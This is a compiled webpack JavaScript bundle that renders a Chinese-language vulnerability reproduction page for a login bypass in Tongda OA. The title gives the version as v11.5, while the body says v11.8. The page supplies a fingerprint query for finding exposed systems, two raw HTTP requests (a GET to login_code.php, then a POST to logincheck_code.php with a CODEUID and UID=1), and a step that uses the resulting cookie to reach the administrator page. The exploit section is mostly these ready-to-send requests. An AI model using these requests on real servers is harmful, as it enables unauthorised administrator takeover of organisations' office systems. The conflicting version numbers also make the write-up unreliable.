(window.webpackJsonp=window.webpackJsonp||[]).push([[118],{1756:function(s,t,a){s.exports=a.p+"assets/img/1628306796311-4c49ac12-0e18-44ef-a0c2-c6a2d7d0f20a.026faf74.png"},1757:function(s,t,a){s.exports=a.p+"assets/img/1628306860352-5e9f9343-742d-4697-abe8-7e5c2534722d.2a4953c5.png"},1758:function(s,t,a){s.exports=a.p+"assets/img/1628306918632-bb9e22e6-79b6-4fe1-8839-729fc9b6abe5.7ca8c6b9.png"},1759:function(s,t,a){s.exports=a.p+"assets/img/1628307007812-02e45309-32af-4513-a89c-00aa30fb9366.8f7d97c2.png"},2910:function(s,t,a){"use strict";a.r(t);var e=a(75),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"通达oa-v11-5-logincheck-code-php-登陆绕过漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#通达oa-v11-5-logincheck-code-php-登陆绕过漏洞"}},[s._v("#")]),s._v(" 通达OA v11.5 logincheck_code.php 登陆绕过漏洞")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("通达OA v11.8 logincheck_code.php存在登陆绕过漏洞，通过漏洞攻击者可以登陆系统管理员后台")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("通达OA v11.8")]),e("br"),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v('app="TDXK-通达OA" ')]),e("br"),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("登陆页面")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1756),alt:"img"}})]),s._v(" "),e("p",[s._v("发送第一个请求包")]),s._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("GET")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("general"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("login_code"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("php "),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("HTTP")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" \nUser"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Agent"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" Go"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("http"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("client"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nAccept"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Encoding"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" gzip\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1757),alt:"img"}})]),s._v(" "),e("p",[s._v("再发送第二个恶意请求")]),s._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("logincheck_code"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("php "),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("HTTP")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" \nUser"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Agent"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" Go"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("http"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("client"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Length"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("56")]),s._v("\nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Type"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("x"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("www"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("form"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("urlencoded\nAccept"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Encoding"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" gzip\n\n"),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("CODEUID")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("BD384F12E"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("A758")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("F44F")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("8")]),s._v("A37"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20E2568306")]),s._v("A7"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("D"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("UID")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1758),alt:"img"}})]),s._v(" "),e("p",[s._v("获取cookie后访问管理员页面 "),e("code",[s._v("/general/index.php")])]),s._v(" "),e("p",[e("img",{attrs:{src:a(1759),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);